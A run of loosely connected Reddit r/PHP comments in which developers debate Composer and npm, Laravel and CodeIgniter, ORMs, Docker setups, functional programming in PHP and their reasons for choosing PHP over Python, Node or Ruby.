&gt; &gt; You're creating a straw man for no reason and I don't understand where the negativity is coming from. All I'm trying to do here is share a tool I've built. You know what? You're right. I apologize. It's not fair for me to write this off for the sake of leaving a snarky comment. It's not something I personally would use, but I can appreciate the effort you went through.
This same website claims that ColdFusion is used by more websites than Ruby, and that Perl is used by more websites than JavaScript. I'm having a hard time with this.
I understand that. I strongly dislike countless (most!) things about WordPress just as much as the next guy. I'd much rather use Rails or Go or Node or Laravel, but unfortunately that's not the world I live in. I work for a company that sells WordPress projects. This tool was created to help make WP development at least a little bearable by encouraging local development, version control, dependency management, reproducible SSH deployments and being able to manage your project across multiple environments. But nobody seems to give a shit just because it's related to WordPress. Every time I attempt to share, it gets downvoted and shit on for no reason. I'm tired of it. I'm done trying to share this project here.
I committed the ultimate crime against all good practices and common sense by writing my own. It consists of two files and enough code to handle about 90% of what I do without having to drop into writing raw SQL, and it's loosely based on the builders in Codeigniter and Yii2. You may now downvote me into oblivion.
O! I was not suggesting that they are better, I was just asking. I face the same issues every day. Npm just takes up too much of every resource.
or just a simple choice of setting a default option right at the beginning might do it for everybody, right?
I use docker extensively, actually all the time. I use it during and dev and at production also. The problem with composer during dev on docker, is that for every project with a dockerfile, composer would install the required libs, *again*. I wish I could find a way to manage that. Do you face similar issues?
According to *you*, how do you think that npm and composer have different ways of resolving deps?
Or maybe someone could offer a more appropriate logo?
Choo Choo, Motherfucker! All jokes aside, it seems relevant. I mean, a conductor, generally speaking, instructs how a composition should be "played". We are the composers, creating the compositions.
https://docs.npmjs.com/how-npm-works/npm3-dupe https://docs.npmjs.com/how-npm-works/npm3-nondet
I tend to follow the "specific" guideline. With PHP version I make the minimum verision the one above the version my app will not run on. with libraries, the ones i used to build the app.
Your claim starts with the premise that concatenation is the same as adding, combining and connecting. It's not. The dictionary says: To concatenate: The action of linking things together in a series, or the condition of being linked in such a way To add: Join (something) to something else so as to increase the size, number, or amount To combine: Join or merge to form a single unit or substance To connect: Bring together or into contact so that a real or notional link is established These are all different things, used in different contexts. Especially in computers. Abstracting an operator and have the compiler decide what it does based on deriving the context, is nothing short of guessing. Should this change be implemented, it means you now have to *control context* instead of *what you actually want to do*. That will lead to code like intval($a) + intval($b). Furthermore, I write a fair bit of Javascript/Typescript and every now and then I get bitten by the + operator's duality. It's frustrating. Here's a guy that goes into the peculiarities of Javascript: https://www.youtube.com/watch?v=et8xNAc2ic8 It has a lot of stuff about the + operator, and I for certain don't want to bring that kind of mess into PHP. By the way I regularly use sprintf() if I have to concatenate a big string. That would turn your code into: $newString = sprintf('This is a string. A.%sThis is String. C.%sThis is String D', $stringB, STRINGCONSTANT); The nice part about sprintf() is that you get some extra type insurance, better control over number formatting and easier to internationalize. Plus, if you really have a lot of variables, you can put every argument to sprintf() on its own line to keep it tidy.
After dealing with several of the other package managers from other languages (maven, nuget, npm, bower, pip), i really have to hold back my criticism, because this is one thing the PHP community has, that no other community can compare to. Our package manager is awesome. **that being said** there are a few quality of life things that would be nice to have. * Parallel Downloads * Multiple Formats for composer.json (yaml, php, etc) * Better "exception" reasons from version mismatches
I'm not complaining on the resolution of the dep themselves, but rather at almost everything else. - It is slow. Very slow. If Composer is slow for you, don't even try npm it can be up to *10 times* slower. - Their shrinkwrap system is shit: I notice no speed difference when you have a shrinkwrap and it never prevented me and my colleagues to have different versions of some dependencies if the platform version changed (but was compatible) - The shrinkwrap system is not used by default - Requiring a dep is not saved to the `packages.json` by default - They don't have a plugin system like Composer - Their GitHub management is terrible: it takes *ages* to reply to everything and they don't mind making releases even if there is critical issues (tagged as critical) for the version to be released
I did a lot of research into this for my keynote at PHPConf. Asia about a month ago, and the TL;DR is that we are on track with PHP 5.0 adoption, if not slightly better. These things take time. https://twitter.com/dshafik/status/774526209019346944
No
The sub generally tends to lean negatively towards Laravel. Mostly because they're of the opinion that the framework is too opinionated.
I feel you on the require --save thing and also the GitHub fiasco. Lost a lot of sleep over them.
Judging by your post history you couldn't have worked with many legacy (or otherwise) applications. Don't spout of nonsense when you have no idea what you're talking about lol
&gt; Edit: I also don't have access to any SQL db... I'm sure you have access to SQLite? 
Codeception is great for all kind of tests, but the ones that really surprised me and never used before are the acceptance tests with selenium. Definitely something to have a look at. Cheers!
I am not sure if I understand the references here. Care to ELI5?
Yes, definitely... My only solution so far is to massively refactor everything when everything changes... Spend more time planning how the objects behave etc, and tell the business owners that these changes will take time, and at the same time talking with them about future requirements. Also thank God for phpstorm and doctrine orm to make refactoring way easier ☺️ Also, check out Domain Driven Design... 
I recommend learning about [Domain Models](http://martinfowler.com/eaaCatalog/domainModel.html) ([Crafting Wicked Domain Models](https://vimeo.com/43598193) by Jimmy Bogard is highly recommended) and [Domain-Driven Design](https://en.wikipedia.org/wiki/Domain-driven_design) ([this Pluralsight course](https://www.pluralsight.com/courses/domain-driven-design-fundamentals) is the best introduction in my opinion). Though the sample code in those videos is in C#, it should be straightforward to translate it into PHP. Watching those videos and reading books like [Implementing Domain-Driven Design](https://www.amazon.com/Implementing-Domain-Driven-Design-Vaughn-Vernon/dp/0321834577) have taken my coding to a whole new level.
NotORM's simplicity (nearly zero config) reminds me a bit of http://respect.github.io/Relational/
Hi. Yeah the acceptance tests work well. 
... What? :-) All I'm saying is that projects need maintenance. A project that hasn't been touched in 15 years and relies on PHP 4 isn't "wonderful". Is that controversial? :-)
Ideally you'd use this only for UI regressions. The most important tests in your application are domain API tests. If your domain services are well designed (values in, values out, no highly tangled object graphs), they're very easy to test without the aid of a UI.
Well, he's explaining why in that exact same link. It's not hard to simply add manual escaping for specific names. That fact alone doesn't make Doctrine a bad ORM. It works really well, it's easy to understand and it's absolutely stable. He was asking what I am using, that I am using and I am really happy with it.
`Ctrl + /` and `Ctrl +Shift + /` not doing job well?
Not a framework per se, but I think Drupal 8 can help. You can basically create a router (simlar to Symfony yaml syntax), and return a renderable array (defined in Drupal APIs). Twig, cache, HTTP errors, Most of the sanitizing, Database, session, user authentication, will be taken care of. There is a half-way ORM entity system there, and a query builder + theming, big pipe, etc. 
Actually, I am curious. I hate ORMs and prefer query builders.
I need to build custom system, which basically has not really to do with plain content management, so drupal won't fit as I think, but thanks for reply. 
Looks like it just copies all of Laravel's syntax.
I won't disagree with you, I just use MySQL mostly, that's why I didn't care yet. If you stick to one RDBMS anyways, it's a good choice.
If only.
You can work around it by running composer install on your project folder before docker build. We have to anyway before running tests. Since our build boxes don't have php installed, we do this by using docker run and mounting the project folder as a volume.
This is a hack though, the correct procedure is to always install everything from scratch, you must always be able to build on a clean workspace.
Then a site should say "we don't have accurate information on JavaScript", not "pretty much no one uses JavaScript".
no, phpstorm's comments are weird. Block comments (/* ... */) cannot be uncommented by just inserting your cursor inside the block and pressing ctrl+shift+/. You literally have to highlighted the block for it to work on win10 for some reason. Not sure if this is a bug, but it's damn sure making me annoyed. I'm using 2016.2.1 as well.
PHP7 is a plus. Other than that I don't see why I would want to use this for a new project when there are already more established modern PHP frameworks out there like Laravel / Symfony / Lumen / etc. They also seem to be reinventing everything. Part of the reason why composer is such a great thing is you can leverage existing, battle tested components like Symfony's HTTP layer. You gain nothing by building that on your own.
You clearly have no interest to explore PHP as template engine and your arguments are still just weak excuses. A simple "i like this more" is sufficient.
What the hell is PHTML?
&gt; This is a hack though... In my dev setup, I have docker running on an Ubuntu derivative. I don't have PHP, Mysql, Apache or any of those stacks. I always do my dev work inside docker. So, what I do is: * Have a composer.phar and PHPUnit.phar available in my project template folder. * Mount that folder into docker. * Run composer and go from there. Also, I include the vendor folder in `.gitignore`. And then in my CI server, I start with a fresh docker image from my dockerfile. Git clone the project folder, run composer install and then run the tests. 
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
[removed]
The most MVC frameworks (I know) just have a 1:1 dependency/link from controller to (one) model. But in a none CRUD world you have to deal with more then one model per request. If you have a MVC framework, then you need a new "service" layer for all the business logic "stuff". From a controller you have to "redirect" or "call" the service-layer and not the model-layer. The service layer can decide which model/models (data) you need or how to validate user input for each context.
The project is being maintained by the [BCIT](http://www.bcit.ca/cas/computing/). That could have something to do with the components being written by he team, instead of leveraging composer. I have nothing to back up the previous comment. Just a thought. 
Probably because you're most comfortable with PHP.
PHP does the best job at web apps. I've use Python, Node and Golang for plumbing (e.g. queues, ansible, mail, websockets), but go back to PHP for the "front-end" web app every time. Great productivity (Laravel) + easier hosting (over Ruby/Rails) makes it an easy decision.
Python - no type hinting. I like writing clean code Node - I don't really need everything async... And I find it hard to write clean code in JS, but that is probably my own fault
What are you, some kind of expert?? ^^/s 
These days I usually do the REST API (xml &amp; JSON output) in PHP and then code the front-end (either me or my team) using Ember or if a client mandates it, then Angular. Since I usually work with VoIP or Telephony Systems, I usually another layer of backend that needs to be done in Go or Erlang. 
If type-hinting is your primary motivation, then Go would be a good try for you.
I guess. It is like when you are in a stable relation with your SO, but, on certain days you wake up in the middle of the night in despair remembering your ex. And how badly you want to be with her, *just once more*.
&gt; Composer doesn't support PHP 4, so if you want to find out % of PHP 4 users, that's not relevant. Of course. However the numbers relatively to PHP 5 are very different as well. If you look at the w3tech stats, you will get a very wrong picture of what PHP version adoption looks like from, say, the perspective of a library author who wants to know which PHP versions they should support. Of course, the PHP version statistics for Composer are also skewed due to CI and other factors. The truth is somewhere between those two.
What about requiring users who log in without finishing their profile/register to read a simple list of terms and conditions, agreeing to it, and filling out a profile form with required contact information and credit card info before they can use any site features? Probably would turn away a good number of users who would think they could just register and use the site without giving any information. (It's an online auction site.)
Wasn't Laravel a port of a previous version of CI? I think when CI development languished, Laravel sort of took off. Plus it improved on a lot of issues with CI2 to begin with. 
May be possible. CodeIgniter 2 and Laravel 4 are pretty similar. Laravel just has more advanced features.
Word on the street is that the popular business chat application Slack is written in PHP with basically no objects at all; all functions. The problem that you face with applying functional programming principles to PHP is 1) it takes discipline, which becomes harder as teams grow, since PHP is not designed to force you to write things that way, and 2) PHP doesn't have all of the syntactic conveniences and tools necessary to do functional programming "right."
Money. Sorry if that is not what your looking for but its the truth.
I primarily work with PHP, I also work with Golang, C, C#, C++, Node and Rust; at the end of the day I use the best tool for the job in hand, and when it comes down to it for web backends the answer the majority of the time is PHP. When I started out programming - many years ago - I worked with Quick Basic in DOS before migrating to Visual Basic on Win98; I then transitioned to asp for doing web based stuff before realising that hosting it cost phenomenally more than PHP (v2 or 3 at that time) and that began my journey in working with PHP. Out of all the languages that I work with, I can prototype in PHP in the shortest amount of time and when it comes down to dollars on the hour, the most efficient route is the one that pays the most.
Most companies require you to write your software in a certain language. In my case, that's PHP. Even though I like Ruby, Go and Node more. Job hunting on a language whim doesn't seem very fun.
For functional programming in general, definitely go with http://haskellbook.com. It's modern, it is both theory and practice-heavy, and it is geared toward non-programmers (which is actually _good_ in this case, because the FP style is so different that you're better off pretending you're learning to program again) There aren't quality learning resources for FP in PHP specifically that I know of. But don't worry, I think if you know your PHP well, you're way better off reading the Haskell book I mentioned, and then using your knowledge of PHP's semantics to figure out what techniques are applicable to your PHP. That way you'll end up knowing about not only FP in general, but also a lot about PHP itself as a language, because you will be reasoning about, as well as testing, what kinds of abstractions are natural or unnatural for it. At least I know it helped _me_. During my progressive learning of FP (actually programming language theory in general) I took a tangent and created a little library of FP "patterns" in PHP, as well as a Parser combinator library on top of it, inspired by the likes of Haskell's Parsec. That exercise helped me understand some of the fundamental differences between FP and non-FP languages. In particular, that: 1. Sometimes it is just pointless to try to do functional abstractions in a language which doesn't have the right semantics (i.e. its type system, its evaluation strategy, etc.) for them. 2. OTOH there are certain FP abstractions which are worth implementing pretty much in any language that will allow you to. FP self-learning tip: As a general rule, if you see a tutorial, or book, that claims to be about FP, but what it actually does is tell you about how to use forEach in here, a closure over there, "higher order functions", and making your code "declarative", don't bother. Drop it and search for something better. Then if some other material tells you about reasoning equationally, managing effects, strictness vs. laziness, deriving programs from other programs, folding structures, test generation, etc. that's a sign that you want to keep on reading. 
I've went from Java-&gt;PHP-&gt;Ruby-&gt;JS(Ember/Angular/React)-&gt;PHP and will probably go through many different other languages. It becomes a blur of projects after a while. I stopped caring about the language and more about getting the work done. Personally I am more excited about how MVC is becoming more "standardized" as time has gone on. That and the $$. That is always a factor.
Totally agree on this.
Likewise, *pretty much*. I went the C &gt; VB 5 &gt; C &gt; C++ &gt; C/C++ &gt; Asp &gt; Asp.net(for a week or two) &gt; Java (never pro) &gt; PHP &gt; Python &gt; PHP &gt; Node &gt; PHP &gt; Golang &gt; .... now I am so messed up. You pay, I work. And I have done Erlang for a very long time due to my VoIP career.
They both have poor Windows support and their package managers aren't as good as Composer. Python installs packages globally and requires sudo and Node has dependency hell.
I love python, currently employed doing Django development and freelancing on the side with laravel. If it were up to me, I'd never work with php again
Heh, a while ago Fabien Potencier and Sensio wrote an ansi-to-html library. I ended up making [a wrapper for using it in Twig](https://github.com/beryllium/TwigAnsiExtension). I wonder if it still works ... 
Elixir is awesome. It is built on top of Erlang and is really run to use. 
Why never again for PHP?
Ha! I'm the opposite. Employed writing Laravel apps, but dabbling with some Python on the side.
What are the chances this will actually pass? I would love to see this in PHP
It really doesn't though, it's nowhere near as terrible as NPM. Any of the problems occurring from dependencies isn't due to the fault of Composer, it's from uninformed authors and these can be fixed with pull requests. You don't have the same easy solution for NPM. *^Upvoted ^for ^discussion's ^sake.*
CI is faster than Laravel. Its more basic, has less stuff under the hood. But obviously CI isn't as powerful. For a small very basic site (especially if it doesnt have users signing up), CI is much quicker (to both code and when running) a small basic site than laravel.
Currently sitting through a golang primer class. Any tips?
I have 10+ years of professional experience. I am 29. I am I started off pretty much in 8-9th grade, dabbling in C. Some books at the library and dad's friends who were those early CS guys from the 70's. And then moved on from there. Funny thing is, I never had a general direction towards building a skill set. I took up maths and physics in College. But, I had always been into programming, doing odd stuff until I started getting paid for it. Then slowly I got serious with web programming, unix and one day I discovered VoIP (specifically Asterisk, first) and fell in love with it. So, I pretty much married both of my interests and generally I do system integration/API creation for legacy apps, CRM's and the like. Currently, I am working on my start-up that would specialize in VoIP Management system and Automated Dialers. Looking back, it is a very tedious and unglamorous life most of the time. So, I am not sure whether you *really* want to be where I am lol. But, shoot me any questions, I would be happy to help.
Quick off my head: * What are slices and why are they useful * What problems to expect when using Go concurrency model * Common beginner pitfalls * Get a good grasp on `Composition over inheritance` * Understand the *convoluted* Go inheritance * Character sets and their implication in Go * Stack and Heap variables These are some of the common gotchas that usually new adopters face. Good luck. Let me know if you need help. 
I use Python as a scripting language in some graphics software packages, but I really don't like it. Node I refuse to use because I will not on principle use anything remotely related to or from the stables of Google.
It's funny to hear this argument when that's already Laravel developers says about Symfony, which is exactly what Symfony developers says about Zend... Your "faster" is very vague and IMO meaningless, you can achieve a website with a &lt;200ms response time and 70M hit/day in Symfony. Unless a framework is really shit, there is no big difference. More importantly, you development speed depends more on your knowledges about a framework than anything.
&gt; Unix is a curious choice. Ive been more BSD and Linux lately I meant *nix like systems. I used to use Debian/Fedora but now I am totally a Debian and its derivatives guy. Right now, on my laptop, I am using eOS (Ubuntu derivative) and I always develop on debian or ubuntu server (sometimes CentOS). BSD is stable alright, but when I was first learning, their community behaved very rudely in an elitist way. &gt; You guys hiring ;) We would start from first week of November. But, currently I am physically located in India. My primary operations would be based in India (very little to no dev work, only maintenance and support), Central EU (Cz, Ukraine *et al*) where I would have marketing and possibly interface designers and VoIP engineers and US (SoCal) where I would be. Albeit, I would have the core dev where I would be for the most part. But, I definitely would love to work with remote programmers (I would prefer innovators :-)). Where are you and what are your super powers like?
You are talking about the current verison of CI. That doesn't apply here as there are no metrics on that vs the existing frameworks. As for speed of coding thats subjective. Laravel is pretty damn fast to get up and running with if you're comfortable with it.
Nothing in Laravel requires routes, so all you're doing is this // routes.php $router-&gt;get('endpoint', function() { return view('my-view'); }); Thats pretty damn quick. Other than that old CI may be faster but it forces an unmaintainable mess of spaghetti code that has roots in the php4 era. A big reason why Laravel is popular is that it lets you develop things quickly while at the same time developing them in a maintainable way that won't make you wanna jump off a bridge in 6 months. Also in terms of speed the new version could be much slower because it re-implements a lot of syntax from scratch and copies Laravel's closely. 
Because I needed to actually finish the projects in hand instead of brogramming bullshit.
My first web development language was php, then I dove head first into Ruby on Rails. I will never go back to php. I can express ideas 5x quicker and cleaner in RoR then I could ever with php. RoR just seems to be a natural fit for me.
I just don't use any google tainted material in my dev environments. I use Google products as sparsely and anonymously as possible for personal use. I don't rely on any frameworks really or general libraries for that matter. My specific area does not benefit from one-size-fits-"all"/"none" solutions. The type of data I work with required me to roll my own back-end/front-end system that would, for example, negate the use of node.js, jquery or ajax anyway.
I gave a talk about "functional approach in software design", you can take a look at the slides: https://speakerdeck.com/thunderer/functional-approach-in-software-design . It's about "writing more functional PHP" by slightly altering the usual imperative approach and carrying on from there. I'm open to feedback and questions, please ask some! :)
I've always considered building my own ORM but I honestly think I couldn't even begin to compete with some of the more popular ones.
&gt; isn't put just a post with an extra header? Yes, only the verb is different from HTTP protocol's perspective, but the data is not easily accessible with PHP. For POST method you can simply do `$_POST['username']` and you'll retrieve it's value, while that's not possible for PUT/PATCH. &gt; And wouldn't the router be the one to handle them? Depends on each router. The on you linked doesn't handle requests/responses as well. (It's only a router - it matches URLs, nothing else). Take a look at [this package](https://github.com/PatrickLouys/http) for example. With it i can `$request-&gt;getParameter('username')` and i'll retrieve the value and it also has other cool things that makes working with responses easier. The only issue is that it doesn't work with PUT/PATCH requests, if i tried to do $request-&gt;getParameter('username') on a PATCH request, it would return null; 
&gt; PHP can't handle PUT requests by default, so some people fake it with the extra header. That's not true, PHP can handle any type of request, you can create a full REST API with PHP and without any hacks. The issue is that only accessing PUT/PATCH data is harder in PHP, so people revert to those hacks. Though packages like https://github.com/illuminate/http from big frameworks do it quite successfully and without any hacks. So building a REST API with a full blown framework is quite easy with PHP, though i don't need a full framework in my particular case :)
Look, I don't understand why you make me place you as an idiot here now. Fucking [google](https://www.google.de/search?q=phtml) next time. PHTML has been a popular extension for native-PHP-template-files for years and in many projects. It's nothing I made up. You should really stop hating on me here, I've thrown in many valid reasons against native template engines and you can't tell me things like automatic-escaping are _subjective_, it actually adds value to security. I've developed an own template engine, it's on my GitHub, check it (same username), I don't know what you're trying to achieve here. I know more than enough about templating in PHP to be able to contribute to this discussion. Go troll someone else.
Python and node are fantastic but it's just not what I'm paid to support. 
Im making something on my website, so, in order to get access to that page they'll need to visit one page by clicking button/link/image. So, when they come to that page on my website, they will get the screen with button/text/image and they have to click on link, when they do, website will display my contect to them.
PHP is object oriented yes, but isn't there still good reason to use FP aspects where we can? Most 'hardcore' FP concepts don't even exist/can't be implemented in php, but this doesn't mean we can't use the pieces we do have to improve our code where we can.
At that point, you're stuck. It's up to the package maintainer to keep the Guzzle version updated to the latest version. In fact, the major versions of Guzzle aren't even that different, so for most cases it should be a fairly easy PR too.
Interesting RFC! A shorter way of writing inline functions would indeed be great. For now I have macros in PHPstorm for array_walk/map that create all the boilerplate for me
you can use `pip install --user`, but it's certainly not the default mechanism to do so.
out of interest what search engine do you use then? I'm guessing your mobile phone is Apple based?
If you test REST API you can use built-in helpers of Codeception instead of writing assertions on your own. Check out, maybe this will be useful to you http://codeception.com/docs/10-WebServices#Validate-JSON-structures
I've actually developed with all in the title professionally over the last 10 years and its purely a money thing, here in the UK PHP and .Net are the dominate languages in the job market. I worked with Linux a lot in a job I had for 6 years testing laptop parts and it was mostly Python and C based work purely because that was the best fit but Python jobs here in the North of the UK are very rare. In my last position it was a PHP shop but they allowed me a lot of flexibility and I built one of their new products in Node and Angular. My current role they are slowly bringing all their ecommerce platforms internally, they are all very dated (about 8 years old) all built on a very old version of Codeigniter, so no testing, namespaces, no composer etc etc I'm the sole and lead developer at the moment so I have a clean slate to start re building from scratch as we move everything in-house. I've decided to go down a REST based solution built in GO, the internal reporting apps will be completely Javascript probably Angular or maybe Vue.js and the ecommerce frontends will be built on Laravel 5.3 and vue.js. My reason for going with PHP for the frontends is I don't believe anything else has the maturity or the tool chain behind them for rapid development apart from the .net family but I have no experience with it so PHP is the logically choice. 
Should you test the UI... well, sometimes. But sometimes this is best left to QA. You can describe tests to your QA team in a way that doesn't break the test as you make trivial UI changes (and there are constantly trivial UI changes in a living application). But what you shouldn't do is test the API through the UI. The API changes less, and there can be multiple clients displaying different UI for the same API. It's far more profitable and productive to test your API. And a bug in your domain API can be critical, as it may lead to permanent data corruption or loss in your domain. While a broken UI is a broken UI. It'll get fixed after a bit of downtime.
I tried python, I agree it is powerful language but i do not agree with the strict tab scope resolution. [node](https://www.gamingtribe.com/node) I went VB.net-&gt;PHP-&gt;C#-&gt;PHP-&gt;C++-&gt;PHP im still learning c++ though would like to be experianced in the langauge.
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/functionalprogramming] [Functional Programming in PHP • \/r\/PHP](https://np.reddit.com/r/functionalprogramming/comments/5258gx/functional_programming_in_php_rphp/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
You can simply read from `php://input` to get the raw message body.
Slack's API is PHP. But there is a difference between *functional* programming and *procedural* programming, which uses functions. Pretty sure if Slack is not OOP it's not FP either. 
Given that OP seems to be under heavy time/resource constraints, I second MVSC as a recommendation here. DDD is great if you can start from scratch with a large team and excellent, senior product owner, but for refactoring quickly from an existing tech debt...nah, there's no way that's gonna happen. On the other hand, I've refactored broken MVC applications into MVSC applications in a weekend.
That's true, and is basically the point I was trying to make. You can sort of emulate the notion of functional programming with PHP, but it doesn't have all the tools you need to do it properly. Still, I've seen people do some really heinous contortions with OOP as well; you can shoot yourself in the foot no matter what pattern you use, if you're careless enough.
Running multiple versions of PHP on the same box is pretty painful. Python (pip) and Node (nvm) both do much better at this IMHO.
I've never had a need for those.
No no, my site will display everything normally, except the one "VIP" page, and when they click that link they will get that page displayed, its not against their will, they know they need to do that.
I kinda wanted to try the no framework way, just for fun :) but i like Slim too. Guess i'll have to use it.
Not sure how lack of runtime typing precludes clean code. Having it certainly doesn't mean code is clean (see countless sloppy Java and C family projects) 
One of the best things about php is how quickly I can prototype with it compared to other languages. 
I hacked together a templating system years and years ago that used them, but was the last time I did either of those things. 
I'm curious how you justify using Microsoft tech while disavowing Google. 
Google is by far the more damning company. For all it's flaws, Microsoft still is a software company, selling a product that is not inherently geared towards undermining privacy, control of our devices and content. Google is all about packaging your profile as a product for sale and this is not only extremely sinister, it also devalues anything it comes into contact with and promotes mediocrity. In essence, google does not blink to undermine cultural expression, technological advances and freedom of speech if it hurts their core business of flaccid baked air. They do evil, very much not their so called mantra.
I've not tried Python really, but I've not really tried it because I've felt Python is used more for mathy stuff, or data-science stuff. It seems a little more academic to me. Nothing has really drawn me into it (apart from maybe Django, damn that documentation looks nice). Node, I just am not a big fan of. People say PHP is a poorly designed language, oh man, I just cannot stand JavaScript sometimes. It moves so fast too, everything is always changing, you write something and it's no longer relevant half a year down the line. I know you can use Node for some pretty cool things, and you can get good performance out of it too because of async, I just think that there is always a better choice. I've written stuff in PHP for a good while, I also work with Java, and Go at work. I've done some Scala too (but again, that's quite an academic language). The things I see Node being useful for, I see Go being much better at, and depending on your needs, maybe Java being better. If it's a web application you're building then PHP is fantastic for that kind of thing.
There's a much greater than zero percent chance that code written 15 years ago is still relevant. From a business perspective and often as a developer, it is wonderful that it still works. When it stops working is when it's a problem.
It's a very loose definition of "it works", if we're willing to ignore the elephant in the room. Namely 15 years of unpatched vulnerabilities that PHP 4 has.
No I don't. Your specific take on how you think how or why I list things in an answer that obviously relates to how my dev stack roughly works only tells me that you did not really follow the conversation very well. So I do not really think that I am the one that should be doing the enlightening here when you can do that yourself with much less hassle. (all ignoring the... factual.... liberties you seem to enjoy)
Almost any language that has functions can support strict functional programming. But some (including PHP) make it much more difficult. A developer needs to write their applications as collections of single-purpose functions that take an input, return an output, do not cause side effects (by changing anything outside of the function), and do not *mutate the input* in any way. That last requirement is PHP's sticking point. The problem with PHP is that it doesn't really provide great tools for preventing mutation easily. And since PHP objects are completely full of references, this can be a major headache. You either need to implement your own `clone()` functionality, or you can serialize+unserialize and live the consequences. Let's say a user has a shopping basket and wants to apply a discount coupon to it. You might implement a function to discount all products in the basket by a certain percentage: function applyCouponToShoppingBasket($products, $discount) { // Create a new array so we don't mutate the input array $discountedProducts = []; foreach($products as $inputProduct) { // Don't mutate the object, which may have references in it // OPTION A: implement your own static cloner Product::clone() $outputProduct = Product::clone($inputProduct); // OPTION B: thrash out a deep copy to return a generic `Object` type $outputProduct = unserialize(serialize($inputProduct)); $outputProduct=&gt;price *= 1 - $discount; array_push($discountedProducts, $outputProduct) } return $discountedProducts } Note that in "Option A" you get back an array of `Product` objects. In "Option B" you get back an array of `Object` objects. There is nothing wrong with either approach, but obviously `Objects` won't have any of `Product`'s methods -- only its properties. (This method could also be written with `map()`. I just wanted to show how reference mutation has to be avoided.) 
You should try Rails. You can scaffold and create a MVP in very little time.
PHTML is just a word that some kiddos used to say a decade ago, it is PHP, basta. Your problem is that you think too much. Your template engine is proof enough for me. An elaborate way to show off how great you are with misconceptions.
I never found a case to use them, lol.
Might be able to switch over to typescript for your node js code which does have type hinting.
Who needs shared hosting when you can setup a linode instance for like $10/month? SSDs, 30gb storage w/ 1tb transfer.. No brainer.
I wouldn't say that. PHP is an evolving language. Bullying is not the right word. But php can use Ratchet w/ libevent which is a very low level api which essentially the same stuff that Node uses for async.
That's even more boilerplate, which was the whole point of the post. You can say it's more readable (probably is) but it's more boilerplate.
Hahaha you're right then, I plan on getting python jobs when I'm more fluent with Django 
Again, another person being downvoted for advocating another language. As a daily PHP developer for over 10yrs, this saddens me. I apologize. Edit: I'll wear my zero points like a fucking badge, assholes! :)
As someone who uses gmail aliases, f-u. Helping people validate emails are for front-end validators, not persistence. If I give you ta22175.not.me.but.probably.someone+trash@gmail.com that is where your email is going.
Sometimes subreddits become cult like. 
True. I love PHP, I work with it daily. Sometimes I hate it. I think that exists for many languages (and some people will vary on this of course and swear by their language of choice). I started using ruby out of necessity (Vagrant, capistrano rake files, etc) and ended up learning about new things and enjoying it. Anyway, hopefully those who downvote can at least provide some response about why they feel what you said wasn't relevant or useful because I certainly know it's not untrue. 
It's not necessarily that. PHP frameworks have scaffolding as well. Rails and modern PHP frameworks work very similar. As far as I understand it, most of these frameworks were inspired by Rails. Either work well. It really just comes down to what you know. If you've been doing PHP for 10 years, then you're going to be fast with PHP. Switching to Rails is going to be a massive knock to productivity initially.
Yea, I really don't get it. Digital Ocean is $5 per month for a small droplet. And you can put as many sites on there as you want. Providing they don't get lots of traffic.
Will do!
Hack is good on benchmarks, but, talking about your ordinary app, it would be a pain in the butt to Hack-it. Like doing all the things that you do with PHP on a regular basis is tough IMHO. May be *Hack*ing on a project with special necessities is fine, but, overall it is well, **Hack**-ey.
Java was the first language I became proficient with and as I delved deeper into web development, I found out about PHP. PHP is quite close to the Java syntax so I became quickly comfortable with it. I sometimes write on Ruby, Python, and NodeJS but I still come back to PHP because this is where I write programs most comfortably.
Aye! I have been using it now for a year. I really like it.
**WS** - the one and keep motivator for me, really.
There is a work around which most people don't realize. Composer cannot intervene into these situations because, technically if Composer changes definitions inside classes then it would mess up with the versioning and a host of other things. But, you as the user can easily relegate that conflicting lib into a different top-level namespace and set up `class_alias` on it. 
I heard someone say once that if you are using `$$` then there is something that you are not doing correctly.
&gt; for queues I prefer... Are you implementing queues yourself? Do you have any requirements for distributed queueing? What queue platform are you using? And why is the shared folder not a solution? You could try using docker.
Nah. May be an "anti" pattern if you are talking pure OOP/structured programming but there's nothing "wrong" with it. Sure, it can be a bitch to debug, but being able to generate variables from fors/loops and populate them into arrays which are iterated through later in really creative ways? Priceless (and efficient).
Ha ha... nail's right on the head pal!
Please pardon my frivolity, did you happen to read up on the [Windows 10 fiasco](https://www.google.co.in/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=3&amp;cad=rja&amp;uact=8&amp;ved=0ahUKEwiTl4youYbPAhVBso8KHVdUBPQQFggpMAI&amp;url=http%3A%2F%2Fwww.forbes.com%2Fsites%2Fgordonkelly%2F2015%2F11%2F02%2Fmicrosoft-confirms-unstoppable-windows-10-tracking%2F&amp;usg=AFQjCNGS2keHnLYmHofvAbcJxCxTv-3uQg&amp;sig2=1kWBqx7doCuEI5XKUjlQRg)?
Yeah. IMHO I am yet to see an implementation where `$$` is better than a regular way. But, I am sure that there would be some cases, I would love to know/see them, though.
Well it does look like Beethoven, who is in fact a composer.
https://github.com/jedisct1/libsodium-php - PHP bindings for the Sodium cryptography library Among its many helper utilities includes one called `\Sodium\memzero()`, which overwrites a memory buffer with NUL bytes. Good luck doing that without writing an extension in C.
Npm + webpack is front-end heaven
RoR is painfully slow for large projects.
What exactly do you guys mean by "prototype it"?
Neandarthals still use them to emulate `register_globals`. It's not a *good* use case, but it happens.
To compare to an equivalent bit of Haskell for doing the odd test inline odd_array = [x | x &lt;- [1..7], x `mod` 2 == 1] The advantage of this way of filtering shows up far better when you consider trying to filter with multiple predicates rather than just one.
&gt; For queues I prefer nodejs, even more if it's something complex like video encoding Node (and the event-loop style concurrency in general) are pretty infamously bad at dealing with CPU-heavy tasks since the event loop is blocked while all the number crunching is going through. You might want to be careful with that.
I think any library written in C that you want to use is useful. But if you're learning maybe you should start with some toy projects that may not be useful to anybody but you. Maybe something like Laravel\Collection, port that to C. There's no huge benefit but it should get a pretty good understanding of what it's like to write a php extension.
What is the difference between that and having a finished product? I mean, the functionality does or does not work at the prototype stage?
